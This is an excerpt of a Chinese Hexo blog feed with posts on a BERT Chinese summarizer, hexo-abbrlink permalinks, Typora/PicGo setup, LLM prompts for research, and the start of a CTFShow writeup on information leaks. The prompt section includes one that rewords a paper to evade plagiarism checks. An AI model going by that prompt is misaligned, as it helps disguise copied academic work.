/></p><p>接下来将需要用到该模型的地方修改为我们本地的路径就可以了</p><h1 id="修改源代码"><a class="markdownIt-Anchor" href="#修改源代码"></a> 修改源代码</h1><p>spacy默认使用英文分词，我们需要将其改成中文。</p><p>将 <code>bert-extractive-summarizer/summarizer/sentence_handler.py</code> 下的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> spacy.lang.en <span class="keyword">import</span> English </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, language=English</span>):</span><br></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> spacy.lang.zh <span class="keyword">import</span> Chinese</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, language=Chinese</span>):</span><br></pre></td></tr></table></figure><h1 id="测试模型"><a class="markdownIt-Anchor" href="#测试模型"></a> 测试模型</h1><p>在主目录下创建test.py测试模型，在这里我们使用的是自己手动下载的模型，使用<code>AutoConfig</code>、<code>AutoTokenizer</code>和<code>AutoModel</code>来加载bert-base-chinese/目录下的模型和相关配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> summarizer <span class="keyword">import</span> Summarizer</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load model, model config and tokenizer via Transformers</span></span><br><span class="line">custom_config = AutoConfig.from_pretrained(<span class="string">&#x27;bert-base-chinese/&#x27;</span>)</span><br><span class="line">custom_config.output_hidden_states=<span class="literal">True</span></span><br><span class="line">custom_tokenizer = AutoTokenizer.from_pretrained(<span class="string">&#x27;bert-base-chinese/&#x27;</span>)</span><br><span class="line">custom_model = AutoModel.from_pretrained(<span class="string">&#x27;bert-base-chinese/&#x27;</span>, config=custom_config)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">body = <span class="string">&#x27;准行政院长陈建仁，在公布原文化部长李永得将转任政务委员之后，传出将征询高雄市副市长史哲，出任文化部长。被称为「点子王」的史哲，不但一手催生驳二和高雄总图，10几年来也不断扩展高雄的设计能量，像是高雄春天艺术节、重办大港开唱等等，史哲都是幕后重要推手，但目前文化部仍有公视法修法和中正纪念堂转型，两大关键政策预计要在今年推动，势必将成为检验内阁改组的重要指标。灰色西装外套配上细框眼镜，高雄市副市长史哲，出席海事展剪彩活动，作为高雄近年艺文展演重要推手的他，如今传出可能接任文化部长，立委(民)赵天麟说：「史哲副市长有非常丰富的行政经历，在陈菊市长时代就被称为点子王，在陈其迈市长的时代里面，他更是把亚洲新湾区，变成了是一个国际非常知名的亮点，我相信可以把，这么成功的高雄经验南方经验，成为未来的台湾之光。」盘点史哲过去艺文经历，不但曾担任过高雄的新闻处长，文化局长等等，也曾操刀陈水扁的竞选广告，2009年世运会开幕典礼，筹画设计的三太子骑机车，一举让台湾跃上国际舞台，另外催生驳二和高雄总图，以及推出高雄春天艺术节，重办大港开唱等等，也都出自史哲之手，源源不绝的创意经验，堪称超级点子王。立委(国)李德维说：「他过去长期是在民进党内参与政治活动，尤其是相关的学运以及工运，现在却因为担任高雄市的文化局长，就要升任文化部长，真的让人大失所望。」虽然史哲并没证实即将入阁，不过原文化部长李永得，已经要转任政委，而目前文化部仍有公视法修法，和中正纪念堂转型两大关键政策，预计要在今年推动，究竟最终，是不是由史哲继续接手，未来文化部长的执行力，将成为检验内阁改组的重要指标。新闻来源：华视新闻&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">model = Summarizer(custom_model=custom_model, custom_tokenizer=custom_tokenizer)</span><br><span class="line"><span class="built_in">print</span>(model(body, num_sentences=<span class="number">3</span>))</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">准行政院长陈建仁，在公布原文化部长李永得将转任政务委员之后，传出将征询高雄市副市长史哲，出任文化部长。 被称为「点子王」的史哲，不但一手催生驳二和高雄总图，10几年来也不断扩展高雄的设计能量，像是高雄春天艺术节、重办大港开唱等等，史哲都是幕后重要推手，但目前文化部仍有公视法修法和中正纪念堂转型，两大关键政策预计要在今年推动，势必将成为检验内阁改组的重要指标。 立委(国)李德维说：「他过去长期是在民进党内参与政治活动，尤其是相关的学运以及工运，现在却因为担任高雄市的文化局长，就要升任文化部长，真的让人大失所望。」</span><br></pre></td></tr></table></figure><h1 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章"></a> 参考文章</h1><ul><li><a href="https://blog.csdn.net/du_lun/article/details/129462104">https://blog.csdn.net/du_lun/article/details/129462104</a></li><li><a href="https://blog.csdn.net/m0_46295727/article/details/133221439">https://blog.csdn.net/m0_46295727/article/details/133221439</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工程记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bert </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『SEO优化』：Hexo-abbrlink插件生成hexo永久固定链接</title>
      <link href="/posts/1e78.html"/>
      <url>/posts/1e78.html</url>
      
        <content type="html"><![CDATA[<h1 id="hexo默认url格式存在的问题"><a class="markdownIt-Anchor" href="#hexo默认url格式存在的问题"></a> hexo默认url格式存在的问题</h1><p>Hexo在生成博客文章链接时，默认的静态URL格式是 <code>:year/:month/:day/:title</code>，也就是按照年、月、日、标题格式来生成固定链接的，如<code>http://xxx.yy.com/2020/07/06/hello-world</code>。</p><p><strong>这样的话就会存在一些问题：</strong></p><ul><li><p>如果你的标题是中文的话，你的URL链接就会包含中文，例如：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231204194948770.png" alt="image-20231204194948770" /></p><p>这样的url路径复制后会将中文变成一大堆字符串编码：<a href="https://cnhuazhu.top/butterfly/2023/03/01/Flask/%E9%83%A8%E7%BD%B2Flask%E9%A1%B9%E7%9B%AE%E8%87%B3%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%9A%84Docker%E5%AE%B9%E5%99%A8%E5%86%85/">https://cnhuazhu.top/butterfly/2023/03/01/Flask/部署Flask项目至远程服务器中的Docker容器内/</a></p><p>如果你在其它地方用了你自己这篇文章的url链接，偶然你又修改了该文章的标题，那<strong>这个url链接就会失效</strong>。</p></li><li><p>这样的url格式中年月日都会有分隔符，生成的链接会成为一个四级目录，<strong>对于搜索引擎来说并不是很友好。</strong></p><blockquote><p>百度蜘蛛在抓取网页时遵循以下规则：</p><p>网页的抓取频率与其权重和信用度成正比，尤其是对网站的首页和内页。通常，蜘蛛首先抓取网站的首页，因为首页通常具有更高的权重，而且大多数链接都指向首页。然后，通过首页抓取网站的内页，但并非所有内页都会被蜘蛛抓取。</p><p>搜索引擎认为对于一般的中小型站点，3层结构足以包含所有内容，因此蜘蛛主要抓取前三层的内容。超过三层的内容被认为相对不重要，因此蜘蛛不会经常爬取这些内容。因此，在设计链接结构时，最好将permalink后面的层级控制在2个斜杠以内。</p></blockquote></li></ul><h1 id="hexo-abbrlink的安装配置"><a class="markdownIt-Anchor" href="#hexo-abbrlink的安装配置"></a> <strong>hexo-abbrlink的安装配置</strong></h1><p>为了解决上面提到的问题，我们使用Hexo的插件<strong>hexo-abbrlink</strong>，它能将 Hexo 生成的永久链接转化为一个固定的随机值，极大的缩短了永久链接的长度。一旦生成一个随机值，之后对文章的标题或者时间进行任何修改，这个随机的 abbrlink 是不会发生任何变化的，也为 Hexo 的维护提供了便利。</p><p>博客目录下执行命令安装：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$npm install hexo-abbrlink --save </span><br></pre></td></tr></table></figure><p>修改<code>_config.yml</code>文件中的配置项（记得把原来的<code>permalink:</code>删除掉）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#设置永久链接</span><br><span class="line">permalink: posts/:abbrlink.html  </span><br><span class="line">abbrlink:</span><br><span class="line">    alg: crc16   #算法： crc16(default) and crc32</span><br><span class="line">    rep: dec     #进制： dec(default) and hex</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：</p><blockquote><p>参考文章<a href="https://zhuanlan.zhihu.com/p/169492685">https://zhuanlan.zhihu.com/p/169492685</a></p><p>在生成之前就要改好算法和形式。不然后面再改的话会导致链接不统一。我就踩过坑，但后来是一个文章一个文章删除<code>abbrlink:</code>的值才改过来的，还好我文章不是很多。</p><p>话说最近看到了Hexo-abbrlink2这个插件，可以从1.html开始编。</p><p>我试用了一下，会导致文章重复，正在研究如何解决。如果能从1开始编写的话，这样更容易看得出写了多少篇文章，当前上传和修改的是哪一篇。后面再研究。</p><p>PS：刚使用这个插件后，阅读人数和评论都会变为0，介意慎用！综上所述，这插件适合新站！</p></blockquote><h1 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章"></a> 参考文章</h1><p>侵权删：</p><ul><li><a href="https://zhuanlan.zhihu.com/p/112318081">https://zhuanlan.zhihu.com/p/112318081</a></li><li><a href="https://zhuanlan.zhihu.com/p/169492685">https://zhuanlan.zhihu.com/p/169492685</a></li><li><a href="https://cloud.tencent.com/developer/article/1936315">https://cloud.tencent.com/developer/article/1936315</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『typora』相关配置与体验优化</title>
      <link href="/posts/c91a.html"/>
      <url>/posts/c91a.html</url>
      
        <content type="html"><![CDATA[<p>本文主要介绍typora配置过程中的一些<strong>问题的解决方法</strong>以及<strong>优化体验方案</strong>。</p><h1 id="版本过期报错"><a class="markdownIt-Anchor" href="#版本过期报错"></a> 版本过期报错</h1><p>下载完成后如果出现版本过期的报错：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231204191844101.png" alt="image-20231204191844101" /></p><p>具体解决方法参考：<a href="https://blog.csdn.net/wagnteng/article/details/126585618">https://blog.csdn.net/wagnteng/article/details/126585618</a></p><h1 id="设置右键菜单新建md"><a class="markdownIt-Anchor" href="#设置右键菜单新建md"></a> 设置右键菜单新建md</h1><p>任意位置创建一个txt文件，后缀改为reg</p><p>文件内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\.md]</span><br><span class="line">@=&quot;Typora.md&quot;</span><br><span class="line">&quot;Content Type&quot;=&quot;text/markdown&quot;</span><br><span class="line">&quot;PerceivedType&quot;=&quot;text&quot;</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\.md\ShellNew]</span><br><span class="line">&quot;NullFile&quot;=&quot;&quot;</span><br></pre></td></tr></table></figure><p>完成后运行，运行完成后可以删除掉该文件</p><h1 id="图床配置阿里云-picgo-core-command-line"><a class="markdownIt-Anchor" href="#图床配置阿里云-picgo-core-command-line"></a> 图床配置：阿里云 + PicGo Core (command line)</h1><p>Typora是一个跨平台的markdown编辑器，使用markdown编辑器写文章优点是排版简洁，痛点则是无法像Word那样直接嵌入图片，插入的图片实际上插入的是图片的路径（可以是本地路径也可以是网络路径），默认情况下为本地路径，这种情况下的md文档在别的终端上打开会无法查看图片。</p><p><strong>我们可以自己配置图床构建网络路径，来实现md文档的跨平台跨设备浏览</strong></p><p>下面介绍这里采用阿里云 + PicGo Core (command line)的方法来对图床进行配置的方法：</p><p><strong>1. PicGo Core (command line)下载与配置</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716132921821.png" alt="image-20230716132921821" /></p><p>下载完成后打开找到文件夹 <code>C:\Users\用户名\AppData\Roaming\Typora\picgo\win64\</code> ，在对应文件夹下cmd执行 <code>./.config/Typora/picgo/linux/picgo install gitee-uploader</code>，若执行失败需要去安装nodejs环境</p><blockquote><p>nodejs安装教程：<a href="https://blog.csdn.net/zimeng303/article/details/112167688">https://blog.csdn.net/zimeng303/article/details/112167688</a></p></blockquote><p>完成后打开配置文件</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/348e3092fc111d18984bd35b197a3357.png" alt="image-20200620214326041" /></p><p>文件内容修改如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;picBed&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;uploader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aliyun&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;aliyun&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;accessKeyId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;accessKeySecret&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bucket&quot;</span><span class="punctuation">:</span> <span class="string">&quot;isodatop&quot;</span><span class="punctuation">,</span> <span class="comment">// 存储空间名</span></span><br><span class="line">      <span class="attr">&quot;area&quot;</span><span class="punctuation">:</span> <span class="string">&quot;oss-cn-beijing&quot;</span><span class="punctuation">,</span> <span class="comment">// 存储区域代号</span></span><br><span class="line">      <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;img/&quot;</span><span class="punctuation">,</span> <span class="comment">// 自定义存储路径</span></span><br><span class="line">      <span class="attr">&quot;customUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://isodatop.oss-cn-beijing.aliyuncs.com&quot;</span><span class="punctuation">,</span> <span class="comment">// 自定义域名，注意要加 http://或者 https://</span></span><br><span class="line">      <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span> <span class="comment">// 针对图片的一些后缀处理参数 PicGo 2.2.0+ PicGo-Core 1.4.0+</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;picgoPlugins&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;picgo-plugin-gitee-uploader&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ul><li><p><strong>accesskeyid与secret的获取：</strong></p><p>登录阿里云，进入控制台，可以在里面查看这两个字段</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716170158751.png" alt="image-20230716170158751" /></p></li><li><p><strong>bucket、area、customUrl的获取</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716170626283.png" alt="image-20230716170626283" /></p><p>再点击进入bucket，bucket名称即为isodatop</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716170714631.png" alt="image-20230716170714631" /></p><p>点击概览</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716170833593.png" alt="image-20230716170833593" /></p><p>这里的②为<code>oss-cn-beijing.aliyuncs.com</code>，注意要去掉后面的<code>.aliyuncs.com</code>，将<code>oss-cn-beijing</code>填入area字段</p><p>③为<code>isodatop.oss-cn-beijing.aliyuncs.com</code>，添加上<code>https://</code>后填入 customUrl 字段</p><p><strong>2. 测试</strong></p><p>配置完成后打开typora的偏好设置，验证上传服务是否配置成功</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716171455885.png" alt="image-20230716171455885" /></p><p>出现如下界面则上传成功：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716171616617.png" alt="image-20230716171616617" /></p><blockquote><p><strong>如果出现报错或者上传成功但是图片在typora里面不予显示的情况</strong>：</p><p>注意检查前面几个字段是否按照要求进行了删除与添加相应的字段</p></blockquote></li></ul><h1 id="优化体验设置"><a class="markdownIt-Anchor" href="#优化体验设置"></a> 优化体验设置</h1><ul><li>文本高亮：<a href="https://blog.csdn.net/weixin_40626630/article/details/111405928">https://blog.csdn.net/weixin_40626630/article/details/111405928</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 资源工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『科研』如何使用大模型辅助我们的科研</title>
      <link href="/posts/28f6.html"/>
      <url>/posts/28f6.html</url>
      
        <content type="html"><![CDATA[<h1 id="主流ai工具介绍"><a class="markdownIt-Anchor" href="#主流ai工具介绍"></a> 主流AI工具介绍</h1><p>deepseek：<a href="https://www.aigc.cn/deepseek-guide">全网最全的DeepSeek使用指南，99%的人都不知道的使用技巧</a></p><h1 id="prompt"><a class="markdownIt-Anchor" href="#prompt"></a> Prompt</h1><p>如何让模型按照自己想要的风格和结构输出？答案就是合适的prompt</p><p>网上的prompt库：<a href="https://bestprompts.cn/">https://bestprompts.cn/</a></p><p>我们也可以自己构造prompt，主要要注意COT和结构化输出两个点</p><h2 id="cot输出"><a class="markdownIt-Anchor" href="#cot输出"></a> COT输出</h2><p>什么是COT（思维链）：<a href="https://zhuanlan.zhihu.com/p/670907685">一文读懂：大模型思维链 CoT（Chain of Thought）</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">You are a sophisticated AI text analysis tool. You get an input in the following format:</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Question: question regarding prompt</span><br><span class="line">Email: prompt content</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">The questions will pertain to the quantity of a specific aspect in the prompt&#x27;s content.</span><br><span class="line">Your goal is to provide a floating-point number that quantifies whether and to what extent the aspect exists in the text.</span><br><span class="line">Please approach the analysis in a step-by-step manner, providing up to three sentences of explanation before presenting your final output.</span><br><span class="line">Output your final answer as a floating point number (number between 0 to 1. Note that 0.0 means impossible and 1.0 means certain)</span><br><span class="line">YOUR OUTPUT MUST END IN THE FOLLOWING FORMAT:</span><br><span class="line">FINAL ANSWER: (your answer as a python floating point)</span><br><span class="line">DO NOT OUTPUT ANY NUMBER IN YOUR RESPONSE OTHER THAN YOUR FINAL ANSWER</span><br><span class="line">Begin!</span><br></pre></td></tr></table></figure><h2 id="结构化输出"><a class="markdownIt-Anchor" href="#结构化输出"></a> 结构化输出</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">You are a sophisticated AI text analysis tool.You get an input in the following format:</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Question: question regarding prompt</span><br><span class="line">Prompt: prompt content</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">The questions will pertain to the quantity of a specific aspect in the prompt&#x27;s content.</span><br><span class="line">Your goal is to provide a floating-point number that quantifies whether and to what extent the aspect exists in the text.</span><br><span class="line">&#123;format&#125;</span><br><span class="line">OUTPUT THIS JSON ONLY! WITHOUT ANY TEXT BEFORE OR AFTER IT!</span><br><span class="line">Begin!</span><br><span class="line">Question: &#123;question&#125;</span><br><span class="line">Prompt: &#123;prompt&#125;</span><br></pre></td></tr></table></figure><h1 id="ai-赋能科研"><a class="markdownIt-Anchor" href="#ai-赋能科研"></a> AI 赋能科研</h1><h2 id="论文阅读"><a class="markdownIt-Anchor" href="#论文阅读"></a> 论文阅读</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">prompts:</span><br><span class="line">  task:</span><br><span class="line">    - role: &quot;人工智能专家兼导师&quot;</span><br><span class="line">    - goal: &quot;指导学生阅读并理解论文，并对论文的创意点和重点进行点评&quot;</span><br><span class="line">    - requirements:</span><br><span class="line">      - &quot;了解论文的主题和研究领域&quot;</span><br><span class="line">      - &quot;掌握论文的结构和主要论点&quot;</span><br><span class="line">      - &quot;识别并强调论文的创新之处&quot;</span><br><span class="line">      - &quot;提供对论文贡献和局限性的评价&quot;</span><br><span class="line">    - attentions:</span><br><span class="line">      - &quot;确保点评具有建设性和启发性&quot;</span><br><span class="line">      - &quot;避免对论文进行无根据的批评&quot;</span><br><span class="line">    - subtask:</span><br><span class="line">      - &quot;概述论文的背景和研究动机&quot;</span><br><span class="line">      - &quot;分析论文的方法论和实验设计&quot;</span><br><span class="line">      - &quot;讨论论文的结果和结论&quot;</span><br><span class="line">      - &quot;探索论文的潜在影响和未来研究方向&quot;</span><br><span class="line">    - outputs: &quot;以结构化笔记的形式输出，包括关键点摘要、创新点分析、评价与建议&quot;</span><br><span class="line">    - CoT: true</span><br></pre></td></tr></table></figure><h2 id="数据集处理"><a class="markdownIt-Anchor" href="#数据集处理"></a> 数据集处理</h2><p>让ChatGPT生成训练数据集：<a href="https://zhuanlan.zhihu.com/p/618334308">https://zhuanlan.zhihu.com/p/618334308</a></p><h2 id="论文写作"><a class="markdownIt-Anchor" href="#论文写作"></a> 论文写作</h2><p>写完论文的中文版后，可以使用以下的prompt进行中译英</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">## 角色</span><br><span class="line">你是一位科研论文审稿员，擅长写作高质量的英文科研论文。请你帮我准确且学术性地将以下中文翻译成英文，风格与英文科研论文保持一致。</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">中文论文内容</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">## 规则：</span><br><span class="line">- 输入格式为 Markdown 格式，输出格式也必须保留原始 Markdown 格式</span><br><span class="line">- 以下是常见的相关术语词汇对应表（中文 -&gt; English）：</span><br><span class="line">* 零样本 -&gt; Zero-shot</span><br><span class="line">* 少样本 -&gt; Few-shot</span><br><span class="line"></span><br><span class="line">## 策略：</span><br><span class="line">分三步进行翻译工作，并打印每步的结果：</span><br><span class="line">1. 根据中文内容直译成英文，保持原有格式，不要遗漏任何信息</span><br><span class="line">2. 根据第一步直译的结果，指出其中存在的具体问题，要准确描述，不宜笼统的表示，也不需要增加原文不存在的内容或格式，包括不仅限于：</span><br><span class="line">- 不符合英文表达习惯，明确指出不符合的地方</span><br><span class="line">- 语句不通顺，指出位置，不需要给出修改意见，意译时修复</span><br><span class="line">- 晦涩难懂，模棱两可，不易理解，可以尝试给出解释</span><br><span class="line">3. 根据第一步直译的结果和第二步指出的问题，重新进行意译，保证内容的原意的基础上，使其更易于理解，更符合英文科研论文的表达习惯，同时保持原有的格式不变</span><br></pre></td></tr></table></figure><h2 id="格式检查"><a class="markdownIt-Anchor" href="#格式检查"></a> 格式检查</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我希望你作为一个学术论文编辑。请检查以下引用格式是否正确:</span><br><span class="line">&#123;citation&#125;。</span><br><span class="line">评估引文后， 请向我提供有关其准确性和遵守适当引文风格的反馈，以及任何必要的调整以使其完全符合引|用规范。</span><br></pre></td></tr></table></figure><h2 id="论文降重"><a class="markdownIt-Anchor" href="#论文降重"></a> 论文降重</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I would like you to act as an expert in the [field of your choice], and help students with plagiarism check for their papers. If there are 13 consecutive identical words in the text, they will be considered as duplication. You need to use methods such as adjusting the order of subjects, verbs, and objects, replacing synonyms, adding or deleting words to achieve the goal of plagiarism check. Please modify the following paragraph:</span><br><span class="line"></span><br><span class="line">我想让你充当一位[你希望的某个]领域的专家，帮助学生进行论文的去重修改。如果文章中连续13个字一样，就算重复。你需要通过调整主谓宾语序替换同义词、增减字数等方法，来达到论文去重的目的。请你修改下面这段文字：</span><br></pre></td></tr></table></figure><h1 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章"></a> 参考文章</h1><ul><li><a href="https://baoyu.io/translations/prompt-engineering/chatgpt-prompts-for-academic-writing">15 个 ChatGPT 学术写作神器提示词[译]</a></li><li><a link="https://zhuanlan.zhihu.com/p/637211471">【GPT教程】手把手教你用ChatGPT论文降重、润色、翻译、扩写</a></li><li><a href="https://mp.weixin.qq.com/s/xlSl1vDSBJnLBQto4_gltQ">一文掌握大模型提示词技巧：从战略到战术</a></li><li><a href="https://zhuanlan.zhihu.com/p/670907685">一文读懂：大模型思维链 CoT（Chain of Thought）</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 科研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大模型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『CTF』CTFShow刷题wp记录</title>
      <link href="/posts/18e8.html"/>
      <url>/posts/18e8.html</url>
      
        <content type="html"><![CDATA[<p>本文主要记录作者在ctfshow上的做题writeup，以及总结各种题型的应对技巧</p><p>主要参考</p><ul><li>[<a href="https://www.cnblogs.com/sakura--tears/p/17148300.html">CTFshow-web入门信息收集-wp（1-20) (详解）</a>](<a href="https://www.cnblogs.com/sakura--tears/p/17148300.html">https://www.cnblogs.com/sakura--tears/p/17148300.html</a>)</li><li>爆破web21-28：<a href="https://www.bilibili.com/video/BV1Lv411Y7oA">web入门爆破视频讲解</a></li></ul><h1 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h1><p><a href="https://blog.csdn.net/a597934448/article/details/105431367">CTFHUBWeb技能树——信息泄露writeup</a></p><ul><li><p><strong>robot.txt</strong></p><p>robots.txt是一个纯文本文件，在这个文件中网站管理者可以声明该网站中不想被robots访问的部分，或者指定搜索引擎只收录指定的内容。</p><p>在CTF中，robots.txt文件可能会泄露当前网站目录下存在的一些敏感文件，我们可以直接对其访问。</p><blockquote><p><a href="https://blog.csdn.net/m0_61155226/article/details/123328664">CTFshow-Web入门-Web1-20 （信息收集完结篇）</a></p></blockquote></li><li><p><strong>PHPS文件泄露</strong></p><p>phps文件就是php的源代码文件，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。</p><p>因为用户无法直接通过Web浏览器“看到”php文件的内容，所以需要用phps文件代替。用户访问phps文件就能看到对应的php文件的源码。</p><p>一般是网站下的 index.phps 文件</p></li></ul><h1 id="命令执行"><a class="markdownIt-Anchor" href="#命令执行"></a> 命令执行</h1><h2 id="输入验证绕过总结"><a class="markdownIt-Anchor" href="#输入验证绕过总结"></a> 输入验证绕过总结</h2><h3 id="短标签"><a class="markdownIt-Anchor" href="#短标签"></a> 短标签</h3><p>我们最常见的 PHP 标签就是<code>&lt;?php ?&gt;</code>了，但是 PHP 